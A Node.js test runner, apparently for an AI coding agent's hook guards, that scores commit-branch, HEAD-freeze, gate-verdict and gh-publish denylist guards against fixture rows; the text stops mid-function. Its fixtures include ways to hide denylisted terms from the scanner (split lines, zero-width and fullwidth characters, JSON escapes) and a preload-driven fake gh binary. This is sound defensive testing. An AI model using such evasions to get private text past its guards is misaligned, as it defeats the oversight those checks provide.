#!/usr/bin/env node
"use strict";
/*
 * guard-matrix.js - the standing control for this repo's PreToolUse guards.
 *
 * WHAT IT IS
 *   For every repo-local PreToolUse guard in .claude/settings.json - and for the two
 *   SHIPPED guards in plugins/fluyt/hooks/hooks.json - it
 *   reads the guard's `command` string FROM THE FILE ON DISK, executes it with
 *   `bash -c` and hook JSON on stdin, and scores the observed verdict against a fixture table of
 *   DENY, WARN and ALLOW controls. Exit code IS the verdict: 0 green, non-zero otherwise. Nothing
 *   here needs grepping to be read - this repo ships a live guard denying exactly that habit for
 *   scripts/validate-local.ps1, and the same reasoning applies to a control that reports on guards.
 *   The rows score the shipped hooks.json forms: dropping them would leave the shipped guards with
 *   zero executable coverage in the very repo that authors them. The other shipped PreToolUse hooks are named in PLUGIN_UNCOVERED
 *   ([1]) - a known, listed gap, not a silent one.
 *   Both branch guards judge the working copy a command TARGETS (git -C, else the hook
 *   cwd) instead of the session checkout, and the HEAD-freeze flag records WHERE each live agent
 *   was seen. That record is written by the SubagentStart raise hook and by the HEAD-freeze hook's own
 *   mark step, so the raise hook is scored here too (its event named in [1]), and rows may check the
 *   flag file AFTER the hook returns - a record that was never written changes no verdict.
 *   The shipped closing-keyword echo is scored too: it must read the PR number from the merge
 *   command's own segment only (`gh pr merge --squash --auto && seq 1 12` must not echo PR #1's
 *   body - a false "clean" at the one pre-merge check for a wrongly closing keyword).
 *   The two gh-publish denylist scans (Bash and PowerShell entries, scripts/denylist-scan.js) are scored
 *   with a FIXTURE denylist handed over through DENYLIST_FILE (invented terms written to the fixture dir at
 *   run time, removed with it - the real denylist is never read) and block through EXIT CODE 2, not a JSON
 *   deny, so runRows reads the exit status for those rows. Their saved command is the one on disk,
 *   run through `bash -c`, so a missing script, a missing or empty denylist and bad hook JSON are scored as
 *   the BLOCKS they must be (fail closed - the opposite posture to the three guards above). Every row of
 *   theirs also asserts that nothing the hook prints contains a fixture term OR a fixture path (the
 *   fixture root, so also DENYLIST_FILE; native, slash and MSYS forms, case-insensitive): a reason lands in
 *   the transcript and must name sources symbolically. Their rows score both tiers of the scan (a command that is exactly
 *   one gh invocation in the strict word grammar, whose text must come from a file; any other gh command, which is only
 *   searched for publishing gh invocations) and pin the ALLOW-EXIT class (the scan allows only on positive recognition):
 *   each DENY row names the scanner's own message, so a block for another reason cannot pass as the match; each of the
 *   sixteen bypasses of the second preflight (the decision of 2026-11-15) has a DENY row with a fixture term in the
 *   published value; and the routine commands of the delivery ritual each have an ALLOW row in the strict form. The
 *   self-test also runs MUTATED copies of the scanner (see [7]). The audit mode is scored
 *   against a gh stub that answers read-only `gh api` calls from fixture data (AUDIT rows, [4]).
 *
 * WHY IT EXISTS (do not lose this - it is the whole point)
 *   A guard can ship DEAD and stay dead. A string-built regex loses its doubled backslashes in the
 *   bash -> node.exe argv hand-off, `new RegExp` throws, and the guard's own fail-open `catch`
 *   swallows the throw, so it allows everything. A matrix that hands the script to `node` DIRECTLY
 *   instead of through `bash -c`, the path the hook actually runs on, still runs GREEN. A guard that always allows and a guard
 *   that never runs look identical. That is the shipped hook-authoring skill's silent-failure rule ("pair every
 *   silent-failure hook with something that would notice its absence").
 *   Consequences for anyone editing this runner:
 *     - `bash -c` is NON-NEGOTIABLE for the control. --node-direct exists only as a diagnostic and
 *       is wired to never return an authoritative exit code (see [0]).
 *     - the guard strings are READ FROM DISK, never pasted here. The thing executed must be the
 *       thing shipped.
 *     - the runner proves it can FAIL on every run (see [7]). A control that cannot fail is the very
 *       defect this file exists to prevent, one level up.
 *
 * SAFETY
 *   Fixture command strings are DATA. They are handed to a guard on stdin and never executed - which
 *   is why this file may contain `git commit`, `git checkout` and piped-gate strings that the live
 *   guards would (correctly) deny if a human typed them at the Bash tool.
 *   The HEAD-freeze flag file is written under a FAKE session id (see [3]) - never a real one, which
 *   would freeze the live checkout for whoever is working in it.
 *
 * USAGE
 *   node scripts/guard-matrix.js [path/to/settings.json] [--hooks=<path/to/hooks.json>] [--self-test]
 *                                [--node-direct] [--help]
 *     (no args)       score the repo's own .claude/settings.json AND the shipped
 *                     plugins/fluyt/hooks/hooks.json, then run the self-test
 *     <path>          score a different settings file (this is how the self-test scores a corrupted copy)
 *     --hooks=<path>  score a different plugin hooks.json - a scratch copy with a guard broken by hand
 *                     is how to prove a re-pointed row is bound to the shipped string
 *     --self-test     run ONLY the self-test (skip the real matrix)
 *     --node-direct   DIAGNOSTIC. Re-runs the matrix through `node -e` instead of `bash -c` - the
 *                     blind path that lets a guard ship dead. Always exits 3; never a verification.
 *
 * EXIT CODES
 *   0  GREEN  - every row as expected, and the self-test proved the runner can report FAIL
 *   1  RED    - at least one row mismatched, or an expected guard is missing / ambiguous / uncovered
 *   2  NO VERDICT - the runner could not judge: bad usage, fixture setup failed, or the self-test
 *                   did NOT fail (i.e. the control is broken and every green above is meaningless)
 *   3  DIAGNOSTIC - a --node-direct run. Informational by construction, never authoritative.
 *
 * NOT WIRED INTO THE GATE. scripts/validate-local.ps1 does not call this: the guards are repo-local config CI has no stake in, and a
 * node+bash dependency inside the PowerShell gate is a portability surface this repo has been careful about
 * (see the test-cmd notes in CLAUDE.md). Run it deliberately whenever a guard in settings.json, or a
 * covered guard in the shipped hooks.json, is edited. The expectations below belong to THIS file and describe the CURRENT guards.
 */

const fs = require("fs");
const os = require("os");
const path = require("path");
const cp = require("child_process");
const crypto = require("crypto");

// ---------------------------------------------------------------------------------------------
// [0] Options, constants, output vocabulary
// ---------------------------------------------------------------------------------------------

const KNOWN_FLAGS = ["--self-test", "--node-direct", "--help", "-h"];
const HOOKS_FLAG = "--hooks=";
const ARGV = process.argv.slice(2);
const FLAGS = ARGV.filter((a) => a.indexOf("--") === 0 || a === "-h");
const POSITIONAL = ARGV.filter((a) => FLAGS.indexOf(a) < 0);
const HOOKS_ARGS = FLAGS.filter((a) => a.indexOf(HOOKS_FLAG) === 0);
const OPT = {
  selfTestOnly: FLAGS.indexOf("--self-test") >= 0,
  nodeDirect: FLAGS.indexOf("--node-direct") >= 0,
  help: FLAGS.indexOf("--help") >= 0 || FLAGS.indexOf("-h") >= 0,
};

const REPO_ROOT = path.resolve(__dirname, "..");
const DEFAULT_SETTINGS = path.join(REPO_ROOT, ".claude", "settings.json");
const DEFAULT_PLUGIN_HOOKS = path.join(REPO_ROOT, "plugins", "fluyt", "hooks", "hooks.json");
const SETTINGS_PATH = POSITIONAL.length ? path.resolve(POSITIONAL[0]) : DEFAULT_SETTINGS;
const PLUGIN_HOOKS_PATH = HOOKS_ARGS.length ?
  path.resolve(HOOKS_ARGS[HOOKS_ARGS.length - 1].slice(HOOKS_FLAG.length)) : DEFAULT_PLUGIN_HOOKS;
// One path per guard SOURCE (see [1]). The self-test swaps exactly one of them for a corrupted copy.
const PATHS = { settings: SETTINGS_PATH, plugin: PLUGIN_HOOKS_PATH };

const EXIT_GREEN = 0;
const EXIT_RED = 1;
const EXIT_NO_VERDICT = 2;
const EXIT_DIAGNOSTIC = 3;

// Declared up here rather than beside the row table because the changelog fixtures in [2] are
// built at module load and would hit its temporal dead zone if it stayed below them.
const NL = "\n";

// The gh-publish scan's FIXTURE denylist terms (invented, in-theme; the real denylist is never read here).
// Lowercase as the hook stores them; rows type them in other cases. The second holds a space, and the
// fixture file is written with CRLF, indentation, a comment and blank lines, to score pre-push's parsing.
const GS_TERMS = ["bowsprit-ledger", "maelstrom roster"];

// Every spelling of a fixture path a hook could print on this host (native, forward and back slash, MSYS
// /c/... form, realpath), lowercased with separators folded to "/"; pair with pathLeaks().
function pathForms(p) {
  const out = new Set();
  const add = (x) => {
    const n = x.replace(/[\\/]+/g, "/").toLowerCase().replace(/\/$/, "");
    out.add(n);
    const m = /^([a-z]):(\/.*)?$/.exec(n);
    if (m) out.add("/" + m[1] + (m[2] || ""));
  };
  add(p);
  try { add(fs.realpathSync.native(p)); } catch (e) { /* path absent: native form only */ }
  return Array.from(out);
}
function pathLeaks(text, forms) {
  const t = text.replace(/[\\/]+/g, "/").toLowerCase();
  return forms.some((f) => t.indexOf(f) >= 0);
}

function say(msg) { process.stdout.write(msg + "\n"); }
function pass(msg) { say("  PASS: " + msg); }
function fail(msg) { say("  FAIL: " + msg); }
function warn(msg) { say("  WARN: " + msg); }

function usage() {
  say("usage: node scripts/guard-matrix.js [path/to/settings.json] [--hooks=<path/to/hooks.json>] [--self-test] [--node-direct]");
  say("       exit 0 = every row as expected; 1 = mismatch/missing guard; 2 = no verdict; 3 = diagnostic");
}

// ---------------------------------------------------------------------------------------------
// [1] Guard registry - identity by statusMessage, NEVER by array index
// ---------------------------------------------------------------------------------------------
// An index lookup silently scores the WRONG guard the moment a hook is inserted or reordered, and a
// DELETED guard reads as green. So each guard is found by a stable substring of its statusMessage, a miss is a FAIL, and a
// PreToolUse guard that no entry here claims is ALSO a FAIL: an uncovered guard is an uncontrolled
// guard, which is the condition this file exists to end.
//
// Two SOURCES since `settings` (.claude/settings.json, repo-local - every PreToolUse hook there
// must be claimed) and `plugin` (the shipped hooks.json - every PreToolUse hook there must be claimed
// OR named in PLUGIN_UNCOVERED). The shipped match substrings carry no issue number because the
// shipped statusMessages cite none (plugin text cites versions, never bare issue numbers - CLAUDE.md
// Invariants), so they key on the wording instead.

// `event` (default PreToolUse): the SubagentStart raise hook records WHERE a spawn
// lives, and the HEAD-freeze verdict depends on that record, so it has rows of its own. Only
// PreToolUse is held to the every-hook-must-be-claimed rule below - the other events here are scored
// because a verdict depends on them, not because this file claims to cover every hook of that event.
const GUARDS = [
  {
    key: "commit-branch",
    source: "settings",
    match: "Blocking a direct git commit",
    label: "commit-branch guard - denies a git commit whose TARGET working copy (git -C, else cwd) is on dev/main",
  },
  {
    key: "head-freeze",
    source: "settings",
    match: "HEAD-freeze guard",
    label: "HEAD-freeze guard - denies checkout/switch/reset/stash while an agent shares the target working copy",
  },
  {
    key: "agent-raise",
    source: "settings",
    event: "SubagentStart",
    match: "Raising the HEAD-freeze live-agent flag",
    label: "SubagentStart raise hook - records a spawn, and its linked worktree when the spawn's cwd already shows one",
  },
  {
    key: "gate-verdict",
    source: "settings",
    match: "Blocking a piped grep",
    label: "gate-verdict guard - denies a piped grep/Select-String/sls read of the gate's verdict",
  },
  // `tool` = the tool name the entry's matcher must cover AND the tool_name the hook JSON carries; these two
  // entries share one saved command, so identity is the statusMessage and the matcher is scored too.
  {
    key: "gh-scan-bash",
    source: "settings",
    tool: "Bash",
    match: "denylist (Bash)",
    label: "gh-publish denylist scan, Bash entry - blocks (exit 2, fail closed) a private term in text published through gh",
  },
  {
    key: "gh-scan-ps",
    source: "settings",
    tool: "PowerShell",
    match: "denylist (PowerShell)",
    label: "gh-publish denylist scan, PowerShell entry - same command, PowerShell tool_name and syntax",
  },
  {
    key: "branch-delete",
    source: "plugin",
    match: "before a branch delete",
    label: "SHIPPED branch-delete guard - denies deleting a branch that heads an open PR, fails OPEN when gh cannot answer",
  },
  {
    key: "changelog-heading",
    source: "plugin",
    match: "heading present at HEAD vanished",
    label: "SHIPPED CHANGELOG entry guard, heading clause - warns (never denies) when a heading in HEAD vanished from the commit",
  },
  {
    key: "closing-echo",
    source: "plugin",
    match: "closing keywords before a merge",
    label: "SHIPPED closing-keyword echo - echoes the PR body's closing keywords for the PR the merge command itself names",
  },
];

// Shipped PreToolUse hooks this matrix knowingly does NOT score yet (only the branch-delete and
// changelog-heading guards and the closing-keyword echo are scored). Listed rather than skipped so the gap
// prints on every run, and so a NEW shipped PreToolUse hook - one on neither list - still fails as
// uncovered. An entry here that matches nothing is also a FAIL: a stale exemption is a lie about what
// is covered.
const PLUGIN_UNCOVERED = [
  { match: "Co-Authored-By trailer", why: "co-author-trailers guard - no rows yet" },
];

const SOURCE_LABEL = { settings: "repo-local settings", plugin: "shipped plugin hooks" };

function readHooks(source, filePath) {
  const doc = JSON.parse(fs.readFileSync(filePath, "utf8"));
  const entries = [];
  for (const ev of Object.keys(doc.hooks || {})) {
    (doc.hooks[ev] || []).forEach((entry, i) => {
      (entry.hooks || []).forEach((h, k) => {
        entries.push({ source: source, event: ev, matcher: entry.matcher, index: source + ":" + ev + "[" + i + "].hooks[" + k + "]", hook: h });
      });
    });
  }
  return { doc: doc, entries: entries };
}

const eventOf = (g) => g.event || "PreToolUse";

// Resolve every registry entry against the source files on disk (`paths` = { settings, plugin }).
// Returns { settings, guards, problems, notes }: `problems` is non-empty when a guard is missing,
// matched twice, or present-but-unclaimed - all of which are failures, not skips. `notes` lists the
// PLUGIN_UNCOVERED hooks that were found, for the run to print.
function loadGuards(paths) {
  const src = { settings: readHooks("settings", paths.settings), plugin: readHooks("plugin", paths.plugin) };
  const pre = (s) => src[s].entries.filter((e) => e.event === "PreToolUse");

  const problems = [];
  const notes = [];
  const resolved = {};
  const claimed = new Set();
  for (const g of GUARDS) {
    const entries = src[g.source].entries.filter((e) => e.event === eventOf(g));
    const hits = entries.filter((e) => String(e.hook.statusMessage || "").indexOf(g.match) >= 0);
    if (hits.length === 0) {
      problems.push("expected guard not present: " + g.key + " (no " + eventOf(g) + " statusMessage in " +
        paths[g.source] + " contains \"" + g.match + "\") - a deleted or renamed guard must not read as green");
      continue;
    }
    if (hits.length > 1) {
      problems.push("ambiguous guard identity: " + g.key + " matches " + hits.length + " " + eventOf(g) +
        " hooks - tighten its `match` substring, an ambiguous match scores an unknown guard");
      continue;
    }
    hits.forEach((h) => claimed.add(h.index));
    resolved[g.key] = Object.assign({}, g, {
      index: hits[0].index,
      matcher: hits[0].matcher,
      statusMessage: hits[0].hook.statusMessage,
      command: String(hits[0].hook.command || ""),
      timeout: hits[0].hook.timeout,
    });
    if (!resolved[g.key].command) {
      problems.push("guard " + g.key + " has an empty `command` - nothing to execute");
    }
  }
  const exempt = (e) => e.source === "plugin" &&
    PLUGIN_UNCOVERED.some((u) => String(e.hook.statusMessage || "").indexOf(u.match) >= 0);
  for (const e of pre("settings").concat(pre("plugin"))) {
    if (claimed.has(e.index)) continue;
    if (exempt(e)) {
      notes.push(e.index + ": \"" + e.hook.statusMessage + "\"");
      continue;
    }
    problems.push("uncovered PreToolUse guard at " + e.index + ": \"" + e.hook.statusMessage +
      "\" - add it to GUARDS and give it fixture rows; an uncontrolled guard is how a guard stays dead");
  }
  for (const u of PLUGIN_UNCOVERED) {
    if (!pre("plugin").some((e) => String(e.hook.statusMessage || "").indexOf(u.match) >= 0)) {
      problems.push("stale PLUGIN_UNCOVERED entry \"" + u.match + "\" (" + u.why + ") matches no shipped " +
        "PreToolUse hook - remove it, or the list misstates what this matrix does not cover");
    }
  }
  return { settings: src.settings.doc, guards: resolved, problems: problems, notes: notes };
}

const sha12 = (s) => crypto.createHash("sha256").update(s).digest("hex").slice(0, 12);

// ---------------------------------------------------------------------------------------------
// [2] Fixture repos - built and torn down per run, never checked in
// ---------------------------------------------------------------------------------------------
// The guards resolve a repo by walking up from the hook JSON's `cwd` (or a `git -C`
// target) and reading that working copy's HEAD, so the
// branch under test has to be a REAL branch in a REAL repo. `git init -b <branch>` plus one empty
// commit gets there without ever running checkout/switch/reset/stash - which the live HEAD-freeze
// guard denies while this runner is being developed, and which would in any case move a real HEAD.
// The worktree fixtures exist because a linked worktree's `.git` is a FILE, not a directory. A guard that
// fails open there (`if(!st.isDirectory()) exit 0`) lets a commit in a linked worktree checked out at
// dev or main through unjudged, so the commit guard follows the
// `.git` file's `gitdir:` to that worktree's own HEAD, so the fixtures cover all three shapes: a linked
// worktree on a feature branch (`worktree`) and two on the protected branches themselves (`wtdev`,
// `wtmain`). Those two are added off the `feature` repo because git refuses a second worktree on a
// branch some checkout already holds. A fixture that accidentally had a .git DIRECTORY would score a
// different question while looking identical, so [2] asserts the shape AND the branch it built.
// Two more fixture surfaces exist: a `changelog` repo with real commits (the heading guard
// compares HEAD:<file> against the index, so nothing short of a real commit answers it) and the gh
// stub below, which makes the branch-delete guard offline-deterministic. Both surfaces
// score the SHIPPED hooks.json forms; neither string reads ${CLAUDE_PLUGIN_ROOT}, so they run here
// exactly as the client runs them.

function git(cwd, args) {
  const r = cp.spawnSync("git", args, { cwd: cwd, encoding: "utf8" });
  if (r.status !== 0) {
    throw new Error("git " + args.join(" ") + " failed in " + cwd + ": " + (r.stderr || "").trim());
  }
  return (r.stdout || "").trim();
}

const IDENT = ["-c", "user.name=guard-matrix", "-c", "user.email=guard-matrix@invalid"];

function buildFixtures() {
  const root = fs.mkdtempSync(path.join(os.tmpdir(), "guard-matrix-"));
  const repos = {};
  for (const branch of ["dev", "main", "feature"]) {
    const dir = path.join(root, branch);
    fs.mkdirSync(dir);
    git(dir, ["init", "-q", "-b", branch]);
    git(dir, IDENT.concat(["commit", "-q", "--allow-empty", "--no-gpg-sign", "-m", "fixture"]));
    const head = fs.readFileSync(path.join(dir, ".git", "HEAD"), "utf8");
    // By-construction check: if `git init -b` were ignored, the dev/main DENY rows would silently be
    // running on some other branch and their failure would read as a broken guard.
    if (head.indexOf("refs/heads/" + branch) < 0) {
      throw new Error("fixture repo " + dir + " is not on branch " + branch + " (HEAD: " + head.trim() + ")");
    }
    repos[branch] = dir;
  }
  const linked = (name, base, args, branch) => {
    const wt = path.join(root, name);
    git(base, ["worktree", "add", "-q"].concat(args(wt)));
    if (!fs.statSync(path.join(wt, ".git")).isFile()) {
      throw new Error("worktree fixture " + wt + " has a .git DIRECTORY - the linked-worktree rows would not discriminate");
    }
    const onBranch = git(wt, ["symbolic-ref", "-q", "--short", "HEAD"]);
    if (onBranch !== branch) {
      throw new Error("worktree fixture " + wt + " is on " + onBranch + ", not " + branch);
    }
    repos[name] = wt;
  };
  linked("worktree", repos.dev, (wt) => ["-b", "guard-matrix-wt", wt], "guard-matrix-wt");
  linked("wtdev", repos.feature, (wt) => ["-b", "dev", wt], "dev");
  linked("wtmain", repos.feature, (wt) => ["-b", "main", wt], "main");

  // The heading-guard fixture. It carries a CLAUDE.md stating the `changelog` Project Facts key
  // because the guard resolves the path through that key (the shipped entry's parse): a
  // fixture without one would silently score the default-path fallback and leave the parse untested.
  const cl = path.join(root, "changelog");
  fs.mkdirSync(cl);
  git(cl, ["init", "-q", "-b", "feature"]);
  fs.writeFileSync(path.join(cl, "CLAUDE.md"), "- `changelog`: `CHANGELOG.md` (root)" + NL);
  fs.writeFileSync(path.join(cl, "CHANGELOG.md"), CL_HEAD);
  git(cl, ["add", "-A"]);
  git(cl, IDENT.concat(["commit", "-q", "--no-gpg-sign", "-m", "fixture changelog"]));
  const committed = git(cl, ["show", "HEAD:CHANGELOG.md"]);
  // By-construction check: if HEAD carried no `## [` heading the MISMATCH row could not fail for the
  // reason under test - the guard exits silently when HEAD has no headings to lose.
  if (committed.indexOf("## [0.2.0]") < 0 || committed.indexOf("## [0.1.0]") < 0) {
    throw new Error("changelog fixture HEAD is missing its two headings - the heading rows would not discriminate");
  }
  repos.changelog = cl;

  // The gh-publish scan fixture dir: denylist variants, body files, and a file whose NAME carries a term
  // (the hub's finding: terms sit in local paths and never in published text). `empty-root` has no
  // scripts/ - CLAUDE_PROJECT_DIR points there for the scanner-absent row.
  const gs = path.join(root, "ghscan");
  fs.mkdirSync(path.join(gs, "empty-root"), { recursive: true });
  // `hang-root`: a scanner stub that never yields for 20 s (a synchronous loop, the shape of the real hang), then exits 0 - an ALLOW.
  fs.mkdirSync(path.join(gs, "hang-root", "scripts"), { recursive: true });
  fs.writeFileSync(path.join(gs, "hang-root", "scripts", "denylist-scan.js"), "const end = Date.now() + 20000; while (Date.now() < end) {}" + NL);
  fs.mkdirSync(path.join(gs, "xdg", "denylist"), { recursive: true });
  fs.mkdirSync(path.join(gs, "home", ".config", "denylist"), { recursive: true });
  const terms = "# fixture terms" + "\r\n" + "\r\n" + "  " + GS_TERMS[0].toUpperCase() + "  " + "\r\n" + GS_TERMS[1] + "\r\n";
  fs.writeFileSync(path.join(gs, "terms.txt"), terms);
  fs.writeFileSync(path.join(gs, "xdg", "denylist", "terms.txt"), terms);
  fs.writeFileSync(path.join(gs, "home", ".config", "denylist", "terms.txt"), terms);
  fs.writeFileSync(path.join(gs, "terms-empty.txt"), "# only a comment" + "\r\n" + "   " + "\r\n");
  fs.writeFileSync(path.join(gs, "dirty.md"), "first" + NL + "second" + NL + "third has " + GS_TERMS[0].toUpperCase() + " in it" + NL);
  fs.writeFileSync(path.join(gs, "clean.md"), "first" + NL + "second" + NL);
  fs.writeFileSync(path.join(gs, GS_TERMS[0] + "-clean.md"), "clean text" + NL);
  fs.writeFileSync(path.join(gs, "dirty.json"), JSON.stringify({ body: "a" + NL + "b " + GS_TERMS[1] }));
  fs.writeFileSync(path.join(gs, "clean.json"), JSON.stringify({ body: "a" + NL + "b" }));
  // `gh <create> --recover <file>` inputs (JSON). recover-esc.json carries the first term with its first letter written as a
  // JSON unicode escape: only a scan of the DECODED strings sees it.
  fs.writeFileSync(path.join(gs, "recover-dirty.json"), JSON.stringify({ Title: "t", Body: "x " + GS_TERMS[0] }));
  fs.writeFileSync(path.join(gs, "recover-esc.json"), "{\"Title\":\"t\",\"Body\":\"x " + String.fromCharCode(92) + "u0062" + GS_TERMS[0].slice(1) + "\"}");
  fs.writeFileSync(path.join(gs, "recover-clean.json"), JSON.stringify({ Title: "t", Body: "all clean" }));
  fs.writeFileSync(path.join(gs, "recover-bad.json"), "this is not json " + GS_TERMS[0]);
  if (fs.readFileSync(path.join(gs, "recover-esc.json"), "utf8").toLowerCase().indexOf(GS_TERMS[0]) >= 0 ||
      JSON.parse(fs.readFileSync(path.join(gs, "recover-esc.json"), "utf8")).Body.toLowerCase().indexOf(GS_TERMS[0]) < 0) {
    throw new Error("recover-esc.json must hold the term only AFTER JSON decoding - the decoded-scan row would not discriminate");
  }
  // By-construction check: a fixture file that did not hold its term would make every DENY row below
  // unable to fail for the reason under test.
  if (fs.readFileSync(path.join(gs, "dirty.md"), "utf8").toLowerCase().indexOf(GS_TERMS[0]) < 0 ||
      fs.readFileSync(path.join(gs, "dirty.json"), "utf8").toLowerCase().indexOf(GS_TERMS[1]) < 0) {
    throw new Error("the gh-scan dirty fixtures do not contain their term - the DENY rows would not discriminate");
  }
  // Tier A body files that hide a term from a raw per-line search: split across a line break (the first term; the second,
  // which holds a space, split at its space and padded), a zero-width space inside, fullwidth letters; plus a BOM in front
  // of the term, and the files the hook must refuse: UTF-16, a NUL byte, invalid UTF-8, over the size cap. `sub` is
  // the cd target.
  const t0 = GS_TERMS[0];
  const t1 = GS_TERMS[1];
  const hidden = {
    "split.md": "intro" + NL + t0.slice(0, t0.indexOf("-") + 1) + NL + t0.slice(t0.indexOf("-") + 1) + NL,
    "split2.md": "intro" + NL + t1.split(" ")[0] + NL + t1.split(" ")[1] + NL,
    "padded.md": "intro " + t1.split(" ")[0] + "   " + t1.split(" ")[1] + NL,
    "zw.md": "intro " + t0.slice(0, 4) + String.fromCharCode(0x200b) + t0.slice(4) + NL,
    "fullwidth.md": "intro " + Array.from(t0).map((c) => (c === "-" ? String.fromCharCode(0xff0d) : String.fromCharCode(c.charCodeAt(0) + 0xfee0))).join("") + NL,
  };
  for (const name of Object.keys(hidden)) {
    fs.writeFileSync(path.join(gs, name), hidden[name]);
    // By-construction: a raw per-line, case-insensitive search must NOT find a term in these, or the row would pass for the wrong reason.
    if (hidden[name].split(NL).some((l) => GS_TERMS.some((t) => l.toLowerCase().indexOf(t) >= 0))) {
      throw new Error(name + " holds a term in plain text - its row would not discriminate the hidden-term matching");
    }
  }
  fs.writeFileSync(path.join(gs, "bom-dirty.md"), String.fromCharCode(0xfeff) + t0 + " here" + NL);
  fs.writeFileSync(path.join(gs, "utf16.md"), Buffer.from(String.fromCharCode(0xfeff) + "first" + NL + "second" + NL, "utf16le"));
  fs.writeFileSync(path.join(gs, "nul.md"), Buffer.from("fi" + String.fromCharCode(0) + "rst" + NL));
  fs.writeFileSync(path.join(gs, "latin1.md"), Buffer.from([0x66, 0xe9, 0x0a]));
  fs.writeFileSync(path.join(gs, "big.md"), Buffer.alloc(4 * 1024 * 1024 + 1, 97));
  fs.mkdirSync(path.join(gs, "sub"), { recursive: true });
  fs.writeFileSync(path.join(gs, "sub", "b.txt"), "clean text" + NL);
  repos.ghscan = gs;
  return { root: root, repos: repos };
}

// ---- the heading fixture's three changelog shapes ---------------------------------------------
// 0.2.0/0.1.0 at HEAD; the correct bump ADDS 0.3.0 above; the clobbered-heading failure REPLACES the 0.2.0
// heading, silently reattributing its body to 0.3.0. Em dashes deliberately, like the real file -
// the guard keys on the bracketed version, not the separator, and a fixture using a plain hyphen
// would not notice if that ever stopped being true.
const CL_ENTRY = (v, date, body) => "## [" + v + "] — " + date + NL + NL + "- " + body + NL;
const CL_TOP = "# Fixture changelog" + NL + NL + "Current version: **0.2.0**" + NL + NL + "---" + NL + NL;
const CL_HEAD = CL_TOP + CL_ENTRY("0.2.0", "2026-09-17", "second") + NL + CL_ENTRY("0.1.0", "2026-09-16", "first");
const CL_ADDED = CL_TOP + CL_ENTRY("0.3.0", "2026-09-18", "third") + NL +
  CL_ENTRY("0.2.0", "2026-09-17", "second") + NL + CL_ENTRY("0.1.0", "2026-09-16", "first");
const CL_REPLACED = CL_HEAD.replace("## [0.2.0] — 2026-09-17", "## [0.3.0] — 2026-09-18");

// Set the heading fixture's staging state from scratch for one row. `git reset -q -- .` unstages by
// PATHSPEC: it rewrites the index and never moves HEAD, so it is not the HEAD-moving reset [2]
// avoids. Every row re-establishes its own state because the self-test replays the same rows - a row
// that inherited its predecessor's index would score whatever happened to run before it.
function clState(repo, state) {
  git(repo, ["reset", "-q", "--", "."]);
  const content = state === "added" ? CL_ADDED : state === "intact" || state === "other" ? CL_HEAD : CL_REPLACED;
  fs.writeFileSync(path.join(repo, "CHANGELOG.md"), content);
  fs.writeFileSync(path.join(repo, "other.txt"), "touched" + NL);
  if (state === "other") {
    git(repo, ["add", "--", "other.txt"]);
  } else if (state !== "unstaged-replaced") {
    git(repo, ["add", "--", "CHANGELOG.md"]);
  }
}

// ---- the gh stub the branch-delete guard is scored against ------------------------------------
// The guard calls `gh` with Node's spawnSync, which resolves .exe/.com only - so a gh.cmd shim
// is INVISIBLE here (a gh.cmd first on
// PATH is skipped and the real gh.exe answers instead, which would make every row depend on the
// network, the local auth, and whatever PRs happen to be open). What Node does resolve is a
// copy of node.exe named gh(.exe), driven by a NODE_OPTIONS preload that answers from
// GUARD_MATRIX_GH and exits. The preload is inherited by the guard's OWN node process too, so it
// no-ops unless it finds itself running as `gh` - without that basename test it would hijack the
// guard under test and every row would score the stub instead of the hook.
const GH_STUB_SRC = [
  "const base = require(\"path\").basename(process.execPath).toLowerCase();",
  "if (base === \"gh\" || base === \"gh.exe\") {",
  "  const mode = process.env.GUARD_MATRIX_GH || \"empty\";",
  "  if (mode === \"fail\") { process.stderr.write(\"stub gh: simulated failure (GUARD_MATRIX_GH=fail)\\n\"); process.exit(1); }",
  "  if (mode === \"garbage\") { process.stdout.write(\"not json at all {{{\"); process.exit(0); }",
  // `pr view` for the closing-keyword echo. The body names the PR it was asked for, so a row can
  // pin WHICH PR the hook fetched; the no-number form answers as the current branch's PR, #7. A
  // `-R <repo>` the hook passes on is echoed back as `Closes <repo>#<n>`, so a row can also pin WHICH
  // repo it fetched from - a hook that drops the merge's -R/--repo answers bare `#<n>` instead.
  // a PR-URL argument names its own repo and number, and WINS over -R (verified against real gh
  // 2.101.0: `gh pr view <url> -R other/repo` still views the URL's PR), so the stub answers from the URL.
  "  const a = process.argv.slice(2);",
  "  if (mode === \"view\" && a[0] === \"view\") {",
  "    const ri = a.indexOf(\"-R\"); let rr = ri >= 0 ? a[ri + 1] : \"\"; let pn = a[1];",
  // a GH_HOST the hook forwards in the env is echoed as a `<host>/` prefix, modelling real gh 2.101.0
  // (`gh pr view` against a bogus host): GH_HOST supplies the host only where nothing
  // names one - a PR URL and a HOST/OWNER/REPO -R (hence GH_REPO too) both beat it, a 2-part -R takes it.
  // Unset GH_HOST leaves the output byte-identical, so rows ce-w01..w27 are untouched.
  "    let hh = process.env.GH_HOST || \"\";",
  "    if (/^https?:/.test(a[1])) { const us = a[1].split(\"/\"); rr = us[3] + \"/\" + us[4]; pn = a[1].split(\"/pull/\")[1]; hh = \"\"; }",
  "    if (rr.split(\"/\").length > 2) hh = \"\";",
  "    if (a.indexOf(\"--jq\") >= 0) { process.stdout.write(\"stub body of PR \" + pn + \": Closes \" + (hh ? hh + \"/\" : \"\") + rr + \"#\" + pn + \"\\n\"); process.exit(0); }",
  "    process.stdout.write(JSON.stringify({ number: 7, body: \"stub current-branch body: Fixes #7\" })); process.exit(0);",
  "  }",
  "  if (mode === \"open\") { process.stdout.write(JSON.stringify([{ number: 74, url: \"https://example.invalid/pull/74\" }])); process.exit(0); }",
  "  process.stdout.write(\"[]\"); process.exit(0);",
  "}",
  "",
].join(NL);

// The audit mode's gh stub, serialised into a second preload (same copy-of-node.exe-named-gh trick; the
// preload is inherited by the scanner's own node process and no-ops there). Answers the read-only
// `gh api --paginate --slurp <endpoint>` calls with fixture data; GUARD_MATRIX_GH=audit-dirty plants
// GUARD_MATRIX_TERM (upper-cased) on line 2 of a PR body, a review, a release and a milestone description.
function auditStub() {
  const base = require("path").basename(process.execPath).toLowerCase();
  if (base !== "gh" && base !== "gh.exe") return;
  const mode = process.env.GUARD_MATRIX_GH || "";
  const term = (process.env.GUARD_MATRIX_TERM || "").toUpperCase();
  const a = process.argv.slice(2);
  if (mode === "fail") { process.stderr.write("stub gh: simulated failure\n"); process.exit(1); }
  const text = (planted) => "first line\n" + (planted && mode === "audit-dirty" ? "second line " + term + "\n" : "second line\n");
  const ep = a.filter((x) => x.charAt(0) !== "-" && x !== "api")[0] || "";
  let out = [];
